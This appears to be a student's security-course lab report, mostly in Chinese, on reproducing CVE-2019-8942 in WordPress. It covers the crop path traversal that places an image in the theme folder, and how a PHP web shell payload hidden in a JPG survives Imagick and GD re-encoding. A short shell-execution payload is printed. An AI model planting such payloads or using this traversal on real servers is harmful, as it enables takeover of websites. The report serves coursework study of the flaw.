# CVE-2019-8942

1. After you complete the installation, takes a screenshot of your phpinfo page with the following information.

![](https://i.imgur.com/pbasnQl.png)
![](https://i.imgur.com/A03Z9a3.png)


2. Assume that you use wordpress_{student_id} (e.g., wordpress_0812345) as database name during the WorkPress installation process. Now, use the following SQL statement via MySQL-CLI interface to list the tables and paste the list in your report.
- USE wordpress_{student_id}; SHOW TABLES

![](https://i.imgur.com/lLUybEl.png)

3. Show the results from running the shell command ‘ip addr' on the WordPress server

![](https://i.imgur.com/sLU1Y5r.png)

4. At Step 15 in the tutorial, a command-line shell was created. Use the built-in Linux command to check the principal (the username) of the shell process. Take a screenshot and mark the username

![](https://i.imgur.com/idP8A0K.png)


5. At Step 12 of the tutorial, we cropped the image to create the jpg image inside the theme folder. The corresponding code is shown as follows:

**A -> B -> C -> E**

``` php
if ( is_numeric( $src ) ) {
    $src_file = get_attached_file( $src )
    // 這邊 $src_file 得到的會像是:
    // /var/www/html/wordpress/wp-contents/uploads/2021/05/payload.jpg?/../../../../themes/twentynineteen/shell

    if ( ! file_exists( $src_file ) ) {
    // 而該檔案在 FS 上並不存在，因此 wp 會去存取 URL src link:
    // http://localhost/wordpress/<>/payload.jpg?/../../../../themes/twentynineteen/shell
    // 而因為 url 的 ? 後面接的是 parameter，因此實際上能夠存取到 payload.jpg
        $src = _load_image_to_edit_path( $src, 'full' );
    } else {
        $src = $src_file;
    }
}
```

6. Why didn’t the Imagick re-encoding remove the PHP payload from the image? Did the payload also survive (not removed by) the processing by the GD library? Also, upload the cropped jpg file generated by GD even if the payload is removed. You need to provide the explanations, not just answering yes/no.

> Why didn’t the Imagick re-encoding remove the PHP payload from the image?
因為 Imagick 在 encode image 時並不會把 exif information 給 remove 掉，因此我們可以把 payload 塞在 jpg 在描述 exif information 的位置
![](https://i.imgur.com/gRM1wwh.png)

> Did the payload also survive (not removed by) the processing by the GD library?
在 media.php 中，有個 array 是負責處理 wp 選擇 image library 的優先順序，我們可以從 default 的 Imagick 轉成 GD
``` php
// wp-includes/media.php line 2950-2963
function _wp_image_editor_choose( $args = array() ) {
	...
	// $implementations = apply_filters( 'wp_image_editors', array( 'WP_Image_Editor_Imagick', 'WP_Image_Editor_GD' ) );
	$implementations = apply_filters( 'wp_image_editors', array('WP_Image_Editor_GD', 'WP_Image_Editor_Imagick' ) );
```

然而，payload.jpg 在經過 GD 處理後，payload 依舊能 work
![](https://i.imgur.com/IK4ctwo.png)

不過可以發現寫在 exiftool 內的 payload 不見了
![](https://i.imgur.com/IKeWz0r.png)

左邊為 gd 處理過的 payload.jpg，右邊為原本的 payload.jpg
![](https://i.imgur.com/e9XjfXG.png)

可以看到原本 payload.jpg 結尾的 `<?=``$_GET[0]=``?>` 在經過 gd 處理後還存在，由此可知，payload.jpg 有經過特別處理，使得 gd 在 encode 該 jpg 後 payload 依舊為明文。

可以隨便找一張 jpg 圖驗證一下，左邊為原圖，右邊為 gd 處理後的圖：
![](https://i.imgur.com/RMJWBRY.png)

可以看到在正常情況下 payload 會被 encode